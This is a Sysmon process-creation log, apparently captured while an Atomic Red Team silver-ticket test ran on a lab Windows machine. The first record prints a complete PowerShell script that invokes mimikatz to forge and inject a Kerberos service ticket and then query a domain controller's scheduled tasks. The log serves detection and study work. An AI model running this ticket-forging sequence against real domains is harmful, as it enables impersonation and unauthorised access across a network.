Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%%TEMP%%\silver.txt 2>&1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%%userdnsdomain%% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%%logonserver:\\=%%.%%userdnsdomain%% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9454,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:32.669

ProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%%TEMP%%\silver.txt 2>&1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%%userdnsdomain%% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%%logonserver:\\=%%.%%userdnsdomain%% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-43f8-658d-6602-000000000b00},7044,660,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:46:32.6711456Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:32.669,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:32.6711456Z""/>
      <EventRecordID>9454</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:32.669</Data>
      <Data Name=""ProcessGuid"">{fda94052-43f8-658d-6602-000000000b00}</Data>
      <Data Name=""ProcessId"">660</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%%TEMP%%\silver.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%%userdnsdomain%% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%%logonserver:\\=%%.%%userdnsdomain%% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:32.669

ProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%%TEMP%%\silver.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%%userdnsdomain%% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%%logonserver:\\=%%.%%userdnsdomain%% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  schtasks /query /S %%logonserver:\\=%%.%%userdnsdomain%%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,whoami - displays logged on user information,,,,,,,1,9453,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:31.582

ProcessGuid: {fda94052-43f7-658d-6502-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,whoami.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-43f7-658d-6502-000000000b00},7044,8840,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:46:31.5852570Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:31.582,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:31.5852570Z""/>
      <EventRecordID>9453</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:31.582</Data>
      <Data Name=""ProcessGuid"">{fda94052-43f7-658d-6502-000000000b00}</Data>
      <Data Name=""ProcessId"">8840</Data>
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:31.582

ProcessGuid: {fda94052-43f7-658d-6502-000000000b00}

ProcessId: 8840

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\HOSTNAME.EXE""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,Hostname APP,,,,,,,1,9452,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8",C:\Windows\System32\HOSTNAME.EXE,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:31.555

ProcessGuid: {fda94052-43f7-658d-6402-000000000b00}

ProcessId: 7656

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,hostname.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-43f7-658d-6402-000000000b00},7044,7656,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:46:31.5568597Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:31.555,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:31.5568597Z""/>
      <EventRecordID>9452</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:31.555</Data>
      <Data Name=""ProcessGuid"">{fda94052-43f7-658d-6402-000000000b00}</Data>
      <Data Name=""ProcessId"">7656</Data>
      <Data Name=""Image"">C:\Windows\System32\HOSTNAME.EXE</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Hostname APP</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">hostname.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\HOSTNAME.EXE""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:31.555

ProcessGuid: {fda94052-43f7-658d-6402-000000000b00}

ProcessId: 7656

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cmVxdWVzdCBwcm90b2NvbD0iMy4wIiB1cGRhdGVyPSJPbWFoYSIgdXBkYXRlcnZlcnNpb249IjEuMy4xODEuNSIgc2hlbGxfdmVyc2lvbj0iMS4zLjE1NS44NSIgaXNtYWNoaW5lPSIxIiBzZXNzaW9uaWQ9IntDRjMyQ0M0Ri0wMDM1LTRDQkUtODc2NC00OUJGMUI0MkMxRTB9IiB1c2VyaWQ9Ins5RDcyOUUxMS02MDJBLTRCNzktOTg2NS0xOEY2QzA4MUZFNjl9IiBpbnN0YWxsc291cmNlPSJzY2hlZHVsZXIiIHJlcXVlc3RpZD0ie0U0MzIzQTU1LTNCOTUtNEJFNC1BODlBLTIyM0REOEI2NzVFOX0iIGRlZHVwPSJjciIgZG9tYWluam9pbmVkPSIwIj48aHcgbG9naWNhbF9jcHVzPSI0IiBwaHlzbWVtb3J5PSI4IiBkaXNrX3R5cGU9IjIiIHNzZT0iMSIgc3NlMj0iMSIgc3NlMz0iMSIgc3NzZTM9IjEiIHNzZTQxPSIxIiBzc2U0Mj0iMSIgYXZ4PSIxIi8-PG9zIHBsYXRmb3JtPSJ3aW4iIHZlcnNpb249IjEwLjAuMjI2MjEuMjI4MyIgc3A9IiIgYXJjaD0ieDY0IiBwcm9kdWN0X3R5cGU9IjcyIiBvc19yZWdpb25fbmFtZT0iVVMiIG9zX3JlZ2lvbl9uYXRpb249IjI0NCIgb3NfcmVnaW9uX2RtYT0iMCIgaXNfd2lwPSIwIiBpc19pbl9sb2NrZG93bl9tb2RlPSIwIi8-PG9lbSBwcm9kdWN0X21hbnVmYWN0dXJlcj0iVk13YXJlLCBJbmMuIiBwcm9kdWN0X25hbWU9IlZNd2FyZTcsMSIvPjxleHAgZXRhZz0iJnF1b3Q7cjQ1MnQxK2syVGdxL0hYemp2Rk5CUmhvcEJXUjlzYmpYeHFlVURIOXVYMD0mcXVvdDsiLz48YXBwIGFwcGlkPSJ7RjNDNEZFMDAtRUZENS00MDNCLTk1N